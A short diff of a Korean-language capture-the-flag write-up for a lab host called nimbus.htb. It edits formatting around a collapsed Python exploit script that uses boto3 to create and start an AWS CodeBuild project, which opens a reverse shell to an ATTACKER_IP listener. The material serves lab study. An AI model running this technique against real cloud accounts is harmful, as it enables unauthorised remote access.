@@ -383,7 +383,10 @@ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
 <details>
 <summary>nimbus_revers_exploit.py (클릭해서 보기)</summary>
 
+code block
+
 ```py
+
 # 혹시 buildspec에 `#`으로 인해 오류가 발생하거나 안된다면 #과 그 위 엔터를 지우고 시도해보세요.
 
 import boto3
@@ -464,6 +467,7 @@ cb.create_project(
 # 빌드 시작
 resp = cb.start_build(projectName="nimbus-rev")
 print("Exploit reverse started. Build ID:", resp["build"]["id"], f"Listener의 {ATTACKER_IP}:{LPORT}를 확인해보세요.")
+
 ```
 
 </details>
